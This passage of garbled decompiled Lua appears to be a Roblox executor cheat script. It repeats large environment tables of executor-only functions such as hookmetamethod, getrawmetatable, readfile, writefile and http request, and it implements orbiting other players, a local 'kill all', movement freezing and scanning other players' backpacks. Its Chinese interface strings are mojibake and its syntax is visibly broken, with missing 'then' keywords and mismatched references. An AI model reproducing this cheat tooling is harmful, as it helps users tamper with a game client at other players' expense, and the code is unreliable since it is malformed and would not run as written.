        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element199._G = Element199
        local Character26 = Element199
        local OrbitEnabled = Element199.OrbitEnabled
        local HumanoidRootPart13, HumanoidRootPart14, Element200, Element201, Element202, Element203, Element204, Element205, Position5, Element206
        if OrbitEnabled then
            task.wait()
            OrbitEnabled = LocalPlayer18.Character
            Character26 = Players.Character
            if not (not OrbitEnabled or not Character26) then
                HumanoidRootPart13 = OrbitEnabled:FindFirstChild("HumanoidRootPart")
                HumanoidRootPart14 = Character26:FindFirstChild("HumanoidRootPart")
                if not (not HumanoidRootPart13 or not HumanoidRootPart14) then
                    getgenv(select(6, ...)).OrbitAngle = getgenv(select(9, ...)).OrbitAngle + (getgenv(select(10, ...)).OrbitSpeed or 0.5)
                    Element200 = getgenv(select(7, ...)).OrbitRadius
                    Element201 = getgenv(select(8, ...)).OrbitHeight or 0
                    Element202 = math.cos(getgenv(select(10, ...)).OrbitAngle) * 10
                    Element203 = math.sin(getgenv(select(11, ...)).OrbitAngle) * 10
                    HumanoidRootPart13.CFrame = CFrame.new(HumanoidRootPart14.Position + Vector3.new(Element202, Element201, Element203))
                    Element205 = HumanoidRootPart14.Position.X
                    Position5 = HumanoidRootPart13.Position.Y
                    Element206 = HumanoidRootPart14.Position.Z
                    Element204 = Vector3.new(Element205, Position5, Element206)
                    Position5 = HumanoidRootPart13.Position
                    HumanoidRootPart13.CFrame = CFrame.lookAt(Position5, Element204)
                    OrbitEnabled = getgenv(select(3, ...)).OrbitEnabled
                    task.wait(select(2, ...))
                    while true do
                        OrbitEnabled = LocalPlayer18.Character
                        Character26 = Players.Character
                        if not (not OrbitEnabled or not Character26) then
                            HumanoidRootPart13 = OrbitEnabled:FindFirstChild("HumanoidRootPart")
                            HumanoidRootPart14 = Character26:FindFirstChild("HumanoidRootPart")
                            if not (not HumanoidRootPart13 or not HumanoidRootPart14) then
                                getgenv(select(6, ...)).OrbitAngle = getgenv(select(9, ...)).OrbitAngle + (getgenv(select(10, ...)).OrbitSpeed or 0.5)
                                Element200 = getgenv(select(7, ...)).OrbitRadius
                                Element201 = getgenv(select(8, ...)).OrbitHeight or 0
                                Element202 = math.cos(getgenv(select(10, ...)).OrbitAngle) * 10
                                Element203 = math.sin(getgenv(select(11, ...)).OrbitAngle) * 10
                                HumanoidRootPart13.CFrame = CFrame.new(HumanoidRootPart14.Position + Vector3.new(Element202, Element201, Element203))
                                Element205 = HumanoidRootPart14.Position.X
                                Position5 = HumanoidRootPart13.Position.Y
                                Element206 = HumanoidRootPart14.Position.Z
                                Element204 = Vector3.new(Element205, Position5, Element206)
                                Position5 = HumanoidRootPart13.Position
                                HumanoidRootPart13.CFrame = CFrame.lookAt(Position5, Element204)
                                if getgenv(select(3, ...)).OrbitEnabled then
                                    task.wait(select(2, ...))
                                    continue
                                end
                                break
                            end
                            break
                        end
                        break
                    end
                    return LocalPlayer18
                end
            end
            return LocalPlayer18
        else
            return LocalPlayer18, OrbitEnabled, Character26
        end
    end
    local Element207 = x14
    x14.OrbitEnabled = Request57
    local Element208
    if Request57 then
        Element207 = getgenv(select(3, ...)).OrbitTargetName
        Players = not Element207
        if Players then
            Players = Element163
            Element163("éè¯¯", "è¯·åéæ©ç®æ ç©å®¶", "rbxassetid://71024334944141", 3)
            return Request57, Element207
        else
            Players = game.Players
            Players = Players:FindFirstChild(Element207)
            if not Players then
                Element163("éè¯¯", "ç®æ ç©å®¶ä¸å­å¨", "rbxassetid://71024334944141", 3)
            else
                Element208 = {
                print = print,
                type = type,
                tostring = tostring,
                tonumber = tonumber,
                next = next,
                pairs = pairs,
                ipairs = ipairs,
                select = select,
                rawget = rawget,
                rawset = rawset,
                rawequal = rawequal,
                rawlen = rawlen,
                setmetatable = setmetatable,
                getmetatable = getmetatable,
                assert = assert,
                error = error,
                pcall = pcall,
                xpcall = xpcall,
                unpack = unpack,
                getfenv = getfenv,
                setfenv = setfenv,
                collectgarbage = collectgarbage,
                gcinfo = gcinfo,
                newproxy = newproxy,
                require = require,
                load = load,
                loadstring = load,
                _VERSION = "Lua 5.1",
                string = string,
                table = table,
                math = math,
                bit32 = bit32,
                bit = bit32,
                os = os,
                io = io,
                utf8 = utf8,
                debug = debug,
                coroutine = coroutine,
                buffer = buffer,
                game = game,
                Game = game,
                workspace = workspace,
                Workspace = workspace,
                script = script,
                shared = shared,
                plugin = plugin,
                Instance = Instance,
                Vector2 = Vector2,
                Vector3 = Vector3,
                Vector2int16 = Vector2int16,
                Vector3int16 = Vector3int16,
                CFrame = CFrame,
                Color3 = Color3,
                UDim = UDim,
                UDim2 = UDim2,
                Rect = Rect,
                Region3 = Region3,
                Ray = Ray,
                NumberRange = NumberRange,
                NumberSequence = NumberSequence,
                NumberSequenceKeypoint = NumberSequenceKeypoint,
                ColorSequence = ColorSequence,
                ColorSequenceKeypoint = ColorSequenceKeypoint,
                BrickColor = BrickColor,
                TweenInfo = TweenInfo,
                PhysicalProperties = PhysicalProperties,
                Faces = Faces,
                Axes = Axes,
                Random = Random,
                DateTime = DateTime,
                Font = Font,
                OverlapParams = OverlapParams,
                RaycastParams = RaycastParams,
                Enum = Enum,
                wait = wait,
                tick = tick,
                time = time,
                elapsedTime = elapsedTime,
                typeof = typeof,
                warn = warn,
                spawn = spawn,
                delay = delay,
                task = task,
                getgenv = getgenv,
                getrenv = getrenv,
                getsenv = getsenv,
                getreg = getreg,
                getgc = getgc,
                getloadedmodules = getloadedmodules,
                getinstances = getinstances,
                getnilinstances = getnilinstances,
                getscripts = getscripts,
                getconnections = getconnections,
                getrunningscripts = getrunningscripts,
                getcallingscript = getcallingscript,
                gethui = gethui,
                getthreadidentity = getthreadidentity,
                setthreadidentity = setthreadidentity,
                checkcaller = checkcaller,
                islclosure = islclosure,
                iscclosure = iscclosure,
                isourclosure = isourclosure,
                is_synapse_function = is_synapse_function,
                clonefunction = clonefunction,
                cloneref = cloneref,
                compareinstances = compareinstances,
                newcclosure = newcclosure,
                hookfunction = hookfunction,
                replaceclosure = replaceclosure,
                hookmetamethod = hookmetamethod,
                getrawmetatable = getrawmetatable,
                setrawmetatable = setrawmetatable,
                setreadonly = setreadonly,
                isreadonly = isreadonly,
                make_writeable = make_writeable,
                make_readonly = make_readonly,
                identifyexecutor = identifyexecutor,
                getexecutorname = getexecutorname,
                setclipboard = setclipboard,
                toclipboard = toclipboard,
                setfpscap = setfpscap,
                firetouchinterest = firetouchinterest,
                fireclickdetector = fireclickdetector,
                fireproximityprompt = fireproximityprompt,
                keypress = keypress,
                keyrelease = keyrelease,
                mouse1click = mouse1click,
                mouse1press = mouse1press,
                mouse1release = mouse1release,
                mousemoverel = mousemoverel,
                queue_on_teleport = queue_on_teleport,
                saveinstance = saveinstance,
                decompile = decompile,
                getscriptclosure = getscriptclosure,
                getfunctionhash = getfunctionhash,
                getcustomasset = getcustomasset,
                rconsoleprint = rconsoleprint,
                rconsolename = rconsolename,
                rconsoleclear = rconsoleclear,
                setfflag = setfflag,
                protectgui = protectgui,
                unprotectgui = unprotectgui,
                sethiddenproperty = sethiddenproperty,
                gethiddenproperty = gethiddenproperty,
                isnetworkowner = isnetworkowner,
                isfile = isfile,
                isfolder = isfolder,
                makefolder = makefolder,
                delfile = delfile,
                delfolder = delfolder,
                listfiles = listfiles,
                readfile = readfile,
                writefile = writefile,
                appendfile = appendfile,
                loadfile = loadfile,
                dofile = dofile,
                request = request,
                http_request = request,
                crypt = crypt,
                base64_encode = base64_encode,
                base64_decode = base64_decode,
                base64encode = base64_encode,
                base64decode = base64_decode,
                syn = syn,
                WebSocket = WebSocket,
                Drawing = Drawing,
                DrawingImmediate = Drawing,
                }
                Element208._G = Element208
                Element208.OrbitAngle = 0
                task.spawn(Job210)
            end
            return Request57, Element207, Players
        end
    else
        return Request57, Element207
    end
end

local function runProtected6(Request58, Request59, Request60)
    local function Job211()
        local Element209 = {Title = Request58, Content = Request59, Icon = "check"}
        Element209.Duration = Request60 or 3
        Element31:Notify(Element209)
    end
    pcall(Job211)
    return Request58, Request59, Request60
end

local Element210, Element211, Element212
local function processItems9(Instance22, Instance23)
    local HumanoidRootPart15 = Instance22:WaitForChild("HumanoidRootPart")
    local Attachment = ipairs(x15)
    local Attachment2 = x15
    local Pack24 = table.pack(Attachment(Attachment2, 0))
    local Unpacked42 = table.unpack(Pack24, 1, Pack24.Element204)
    local Trail, Element213, Unpacked43, Element214, numberSequenceKeypoint
    if not (Unpacked42 == nil) then
        Trail = Unpacked42
        while true do
            Unpacked43 = HumanoidRootPart15:FindFirstChild(table.unpack(Pack24, 2, Pack24.Element204))
            if Unpacked43 then
                Unpacked43:Destroy()
                Pack24 = table.pack(Attachment(Attachment2, Trail))
                Unpacked42 = table.unpack(Pack24, 1, Pack24.Element204)
                if not (Unpacked42 == nil) then
                    Trail = Unpacked42
                    continue
                end
            else
                Pack24 = table.pack(Attachment(Attachment2, Trail))
                Unpacked42 = table.unpack(Pack24, 1, Pack24.Element204)
                if Unpacked42 == nil then
                    break
                else
                    Trail = Unpacked42
                    continue
                end
            end
            break
        end
    end
    Attachment = Instance.new("Attachment")
    Attachment.Name = "TrailAttachment0"
    Attachment.Position = Vector3.new(0, 0.5, 0)
    Attachment.Parent = HumanoidRootPart15
    Attachment2 = Instance.new("Attachment")
    Attachment2.Name = "TrailAttachment1"
    Attachment2.Position = Vector3.new(0,-0.5, 0)
    Attachment2.Parent = HumanoidRootPart15
    Trail = Instance.new("Trail")
    Trail.Name = "PlayerTrail"
    Trail.Attachment0 = Attachment
    Trail.Attachment1 = Attachment2
    Trail.Lifetime = 0.8
    Trail.MinLength = 0
    Trail.MaxLength = 0
    Trail.LightEmission = 1
    Trail.LightInfluence = 0
    Trail.FaceCamera = true
    Unpacked42 = NumberSequence.new
    Element213 = {}
    Unpacked43 = NumberSequenceKeypoint.new(0, 1)
    Element214 = NumberSequenceKeypoint.new(1, 0)
    Element213[1] = Unpacked43
    Element213[2] = Element214
    Trail.WidthScale = Unpacked42(Element213)
    Unpacked42 = NumberSequence.new
    Element213 = {}
    Unpacked43 = NumberSequenceKeypoint.new(0, 0)
    Element214 = NumberSequenceKeypoint.new(0.7, 0.3)
    numberSequenceKeypoint = NumberSequenceKeypoint.new(1, 1)
    Element213[1] = Unpacked43
    Element213[2] = Element214
    Element213[3] = numberSequenceKeypoint
    Trail.Transparency = Unpacked42(Element213)
    if Instance23 == "å½©è¹"
    Trail.Color = Element212
else
    Unpacked42 = Element211[Instance23] or Color3.fromRGB(0, 255, 255)
    Trail.Color = ColorSequence.new(Unpacked42)
end

Trail.Parent = HumanoidRootPart15
Element210 = Trail
end

local Players
local function processItems10()
    local Character27, HumanoidRootPart16, Element215, Element216, Element217, Unpacked44, Unpacked45, Pack25
    if Element210 then
        Element210:Destroy()
        Element210 = nil
        Character27 = Players.Character
        HumanoidRootPart16 = Character27:FindFirstChild("HumanoidRootPart")
        if HumanoidRootPart16 then
            Element215 = ipairs(x16)
            Element216 = x16
            Pack25 = table.pack(Element215(Element216, 0))
            Unpacked44 = table.unpack(Pack25, 1, Pack25.Element204)
            if not (Unpacked44 == nil) then
                Element217 = Unpacked44
                while true do
                    Unpacked45 = HumanoidRootPart16:FindFirstChild(table.unpack(Pack25, 2, Pack25.Element204))
                    if Unpacked45 then
                        Unpacked45:Destroy()
                        Pack25 = table.pack(Element215(Element216, Element217))
                        Unpacked44 = table.unpack(Pack25, 1, Pack25.Element204)
                        if Unpacked44 == nil then
                            Element217 = Unpacked44
                        else
                            Element217 = Unpacked44
                            continue
                        end
                    else
                        Pack25 = table.pack(Element215(Element216, Element217))
                        Unpacked44 = table.unpack(Pack25, 1, Pack25.Element204)
                        if Unpacked44 == nil then
                            break
                        else
                            Element217 = Unpacked44
                            continue
                        end
                    end
                    return Character27, HumanoidRootPart16, Element215, Element216, Element217, table.unpack(Pack25, 1, Pack25.Element204)
                end
            end
            return Character27, HumanoidRootPart16, Element215, Element216, Unpacked44, table.unpack(Pack25, 1, Pack25.Element204)
        end
    end
end

local Element218
local function updateState2(Request61)
    Element218 = Request61
    local fromRGB
    if Element210 then
        if Request61 == "å½©è¹"
        Element210.Color = Element212
    else
        fromRGB = Color3.fromRGB(0, 255, 255)
        Element210.Color = ColorSequence.new(fromRGB)
    end
    return
end

end

local Element219, Element220
local function Job212(Request62)
    if Element219 then
        task.wait(1)
        Element220(Request62, Element218)
        return Request62
    else
        return
    end
end

local Players, Element221
local function callback9(Request63)
    Element219 = Request63
    local Character28
    if Request63 then
        Character28 = Players.Character
        if Character28 then
            Element220(Character28, Element218)
        end
        Players("å°¾è¿¹", "å·²å¼å¯å°¾è¿¹", 2)
        return Request63, Character28
    else
        Element221()
        Players("å°¾è¿¹", "å·²å³é­å°¾è¿¹", 2)
        return Request63
    end
end

local Element222
local function Job213(Request64)
    Element222(Request64)
    return Request64
end

local function runProtected7(Request65, Request66)
    local Animate
    local function tryOperation()
        local Element223 = Request65.Element223
        Animate.idle.Animation1.AnimationId = Element223
        Element223 = Request65.idle2
        Animate.idle.Animation2.AnimationId = Element223
        Element223 = Request65.walk
        Animate.walk.WalkAnim.AnimationId = Element223
        Element223 = Request65.run
        Animate.run.RunAnim.AnimationId = Element223
        Element223 = Request65.jump
        Animate.jump.JumpAnim.AnimationId = Element223
        Element223 = Request65.climb
        Animate.climb.ClimbAnim.AnimationId = Element223
        Element223 = Request65.fall
        Animate.fall.FallAnim.AnimationId = Element223
    end
    local Character29 = Players.Character
    Animate = not Character29
    local Humanoid18, Animator
    if Animate then
        Animate = Players
        Players("éè¯¯", "è§è²æªå è½½", 3)
        return Request65, Request66, Character29
    else
        Animate = Character29:FindFirstChild("Animate")
        Humanoid18 = Character29:FindFirstChildOfClass("Humanoid")
        if not Animate or not Humanoid18 then
            Players("éè¯¯", "æ¾ä¸å° Animate æ Humanoid", 3)
            return Request65, Request66, Character29, Animate, Humanoid18
        else
            Animate.Disabled = true
            Animator = Humanoid18:FindFirstChildOfClass("Animator")
            pcall(tryOperation)
            Humanoid18:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait(0.1)
            Animate.Disabled = false
            Players("å¨ç»å·²åºç¨", (Request66 or "æªç¥") .. " å¨ç»å·²è®¾ç½®", 3)
            return Request65, Request66, Character29, Animate, Humanoid18, Animator
        end
    end
end

local function callback10(Request67)
    local function Job214(...)
        local Element224 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element224._G = Element224
        local Humanoid19 = Element224
        local FrozenEnabled = Element224.FrozenEnabled
        if FrozenEnabled then
            FrozenEnabled = game.Players.LocalPlayer.Character
            Humanoid19 = FrozenEnabled:FindFirstChildOfClass("Humanoid")
            if Humanoid19 then
                Humanoid19.WalkSpeed = 0
                Humanoid19.JumpPower = 0
            end
            task.wait(0.1)
            while true do
                FrozenEnabled = getgenv(select(2, ...)).FrozenEnabled
                if FrozenEnabled then
                    FrozenEnabled = game.Players.LocalPlayer.Character
                    Humanoid19 = FrozenEnabled:FindFirstChildOfClass("Humanoid")
                    if Humanoid19 then
                        Humanoid19.WalkSpeed = 0
                        Humanoid19.JumpPower = 0
                    end
                    task.wait(0.1)
                    continue
                end
                break
            end
            return FrozenEnabled
        else
            return FrozenEnabled, Humanoid19
        end
    end
    local Element225 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element225._G = Element225
    Element225.FrozenEnabled = Request67
    local Character30, Humanoid20
    if Request67 then
        Element31:Notify({Title = "æ æ³ç§»å¨å·²å¼", Content = "", Duration = 3})
        task.spawn(Job214)
        return Request67
    else
        Character30 = game.Players.LocalPlayer.Character
        if Character30 then
            Humanoid20 = Character30:FindFirstChildOfClass("Humanoid")
            if Humanoid20 then
                Humanoid20.WalkSpeed = 16
                Humanoid20.JumpPower = 50
            end
        end
        Element31:Notify({Title = "æ æ³ç§»å¨", Content = "", Duration = 3})
        return Request67, Character30
    end
end

local Character31, Unpacked46
local function Job215()
    local Character32 = Players.Character
    local Animate2 = Character32
    if Character32 then
        Animate2 = Character32:FindFirstChild("Animate")
    end
    local Name
    if Animate2 then
        Name = Unpacked46.Name
        Character31(Unpacked46.data, Name)
    else
        Players("éè¯¯", "è§è²æªå è½½å®æï¼è¯·ç¨ååè¯", 3)
    end
    return Character32
end

local function callback11()
    game.Players:GetPlayers()
    local Element226
    for Key, value in ipairs(Element226), Element226, 0 do
        LocalPlayer19 = game.Players.LocalPlayer
        if value ~= LocalPlayer19 and value.Character then
            value.Character:FindFirstChildOfClass("Humanoid").Health = 0
        end
    end
    Element31:Notify({
    Title = "å·²å»æææäºº",
    Content = "æ¬å°ææ",
    Duration = 3,
    })
end

local function callback12()
    local Character33 = game.Players.LocalPlayer.Character
    local Humanoid21
    if Character33 then
        Humanoid21 = Character33:FindFirstChildOfClass("Humanoid")
        if Humanoid21 then
            Humanoid21.Health = 0
        end
    end
    Element31:Notify({Title = "å·²èªæ", Content = "æ¬å°ææ", Duration = 3})
    return Character33
end

local function callback13(Request68)
    local function backgroundTask(...)
        local Element227 = x18
        local GetBackpackEnabled = x18.GetBackpackEnabled
        local Element228, Unpacked47, Backpack, Element229, Element230, Element231, Unpacked48, LocalPlayer20, Pack26
        if GetBackpackEnabled then
            game.Players:GetChildren()
            GetBackpackEnabled = ipairs(Element227)
            Pack26 = table.pack(GetBackpackEnabled(Element227, 0))
            Unpacked47 = table.unpack(Pack26, 1, Pack26.Element204)
            if Unpacked47 == nil then
                Element228 = Unpacked47
                local __cont14 = false
                while true do
                    task:wait(Element228, table.unpack(Pack26, 1, Pack26.Element204))
                    while true do
                        if getgenv(select(3, ...)).GetBackpackEnabled then
                            game.Players:GetChildren()
                            GetBackpackEnabled = ipairs(Element227)
                            Pack26 = table.pack(GetBackpackEnabled(Element227, 0))
                            Unpacked47 = table.unpack(Pack26, 1, Pack26.Element204)
                            if Unpacked47 == nil then
                                Element228 = Unpacked47
                                __cont14 = true
                                break
                            else
                                Element228 = Unpacked47
                                local __brk2 = false
                                while true do
                                    Backpack = table.unpack(Pack26, 2, Pack26.Element204)
                                        :FindFirstChild("Backpack")
                                    if not Backpack then
                                        task.wait(table.unpack(Pack26, 5, Pack26.Element204))
                                        while true do
                                            Pack26 = table.pack(ipairs(Element227, Element228))
                                            Unpacked47 = ipairs(Element227)
                                            if Unpacked47 == nil then
                                                __brk2 = true
                                                break
                                            else
                                                Element228 = Unpacked47
                                                Backpack = Element227:FindFirstChild("Backpack")
                                                if Backpack then
                                                    break
                                                else
                                                    task.wait(table.unpack(Pack26, 5, Pack26.Element204))
                                                end
                                            end
                                        end
                                        if __brk2 then
                                            break
                                        end
                                    end
                                    Backpack:GetChildren()
                                    Element229 = ipairs(Element230)
                                    Pack26 = table.pack(Element229(Element230, 0))
                                    Unpacked48 = table.unpack(Pack26, 1, Pack26.Element204)
                                    if not (Unpacked48 == nil) then
                                        Element231 = Unpacked48
                                        while true do
                                            if table.unpack(Pack26, 2, Pack26.Element204)
